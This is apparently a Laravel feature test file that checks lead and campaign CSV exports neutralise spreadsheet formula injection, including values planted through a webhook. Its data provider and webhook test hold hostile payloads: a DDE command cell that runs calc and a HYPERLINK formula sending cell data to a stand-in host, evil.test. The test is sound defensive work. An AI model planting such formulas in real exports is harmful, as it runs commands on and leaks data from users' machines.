<?php

namespace Tests\Feature;

use App\Models\Lead;
use App\Models\WebhookEndpoint;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Hash;
use Tests\TestCase;

/**
 * A CSV export is opened in Excel, and Excel executes any cell that begins with
 * =, +, - or @. Lead names and campaign names come from an unauthenticated
 * webhook, so an attacker who knows one endpoint secret could plant a formula
 * that runs on the machine of whoever exports the list.
 */
class ExportSafetyTest extends TestCase
{
    use RefreshDatabase;

    private array $t;

    /** Payloads a spreadsheet would treat as a formula rather than text. */
    public static function dangerousValues(): array
    {
        return [
            'command' => ["=cmd|'/c calc'!A1"],
            'hyperlink exfiltration' => ['=HYPERLINK("http://evil.test/?d="&A1,"Open")'],
            'leading plus' => ['+1+1'],
            'leading minus' => ['-1+1'],
            'leading at' => ['@SUM(1+1)'],
            'tab prefixed' => ["\t=1+1"],
        ];
    }

    protected function setUp(): void
    {
        parent::setUp();
        $this->t = $this->provisionTenant('Export Realty');
    }

    /**
     * @dataProvider dangerousValues
     */
    public function test_a_formula_in_a_lead_name_is_neutralised_in_the_export(string $payload): void
    {
        $this->asTenant($this->t['tenant'], fn () => Lead::create([
            'full_name' => $payload,
            'phone' => '0512345678',
            'phone_normalized' => '+966512345678',
        ]));

        $csv = $this->actingAs($this->t['admin'])->get('/api/v1/leads/export')->streamedContent();

        $this->assertStringNotContainsString(',='.ltrim($payload, "'"), $csv);
        $this->assertFormulaNeutralised($csv, $payload);
    }

    public function test_a_formula_injected_through_the_webhook_is_neutralised(): void
    {
        // The realistic path: nobody types this in, an ad platform or a landing
        // page posts it.
        $endpoint = $this->asTenant($this->t['tenant'], fn () => WebhookEndpoint::first());
        $secret = 'export-safety-secret-0123456789';
        $endpoint->forceFill(['secret_hash' => Hash::make($secret)])->saveQuietly();

        $this->withHeader('X-Webhook-Secret', $secret)
            ->postJson("/api/v1/integrations/webhooks/{$endpoint->key}/leads", [
                'name' => '=cmd|\'/c calc\'!A1',
                'mobile' => '0512345678',
                'campaign' => '=HYPERLINK("http://evil.test","click")',
            ])->assertOk();

        $leads = $this->actingAs($this->t['admin'])->get('/api/v1/leads/export')->streamedContent();
        $report = $this->actingAs($this->t['admin'])->get('/api/v1/reports/export?type=campaign')->streamedContent();

        // The lead export carries the injected name; the report carries the
        // injected campaign. Each must be neutralised and still readable.
        $this->assertFormulaNeutralised($leads, '=cmd');
        $this->assertFormulaNeutralised($report, '=HYPERLINK');
    }

    public function test_a_formula_in_a_report_label_is_neutralised(): void
    {
        $this->asTenant($this->t['tenant'], fn () => Lead::create([
            'full_name' => 'عميل عادي',
            'phone_normalized' => '+966512345679',
            'campaign_name' => '=1+1',
        ]));

        $csv = $this->actingAs($this->t['admin'])
            ->get('/api/v1/reports/export?type=campaign')
            ->streamedContent();

        $this->assertFormulaNeutralised($csv, '=1+1');
    }

    public function test_ordinary_values_are_left_readable(): void
    {
        // Neutralising must not mangle the Arabic names that make up the file.
        $this->asTenant($this->t['tenant'], fn () => Lead::create([
            'full_name' => 'سعود الحربي',
            'phone' => '+966512345678',
            'phone_normalized' => '+966512345678',
            'city' => 'الرياض',
        ]));

        $csv = $this->actingAs($this->t['admin'])->get('/api/v1/leads/export')->streamedContent();

        $this->assertStringContainsString('سعود الحربي', $csv);
        $this->assertStringContainsString('الرياض', $csv);
        $this->assertStringNotContainsString("'سعود", $csv);
        // A phone number starting with + must stay usable, so it is quoted, not
        // left as something Excel would evaluate.
        $this->assertStringNotContainsString(',+966512345678', $csv);
    }

    private function assertFormulaNeutralised(string $csv, string $needle): void
    {
        foreach (explode("\n", $csv) as $line) {
            foreach (str_getcsv($line) as $cell) {
                $this->assertFalse(
                    isset($cell[0]) && in_array($cell[0], ['=', '+', '-', '@', "\t", "\r"], true),
                    "A cell still begins with a formula character: [{$cell}]",
                );
            }
        }

        // fputcsv doubles any embedded quote, so compare on a fragment without
        // them — the point is that the value survived, not its exact escaping.
        $readable = ltrim($needle, "=+-@\t\r");
        $fragment = strtok($readable, '("') ?: $readable;

        $this->assertStringContainsString($fragment, $csv, 'The value should still be readable.');
    }
}
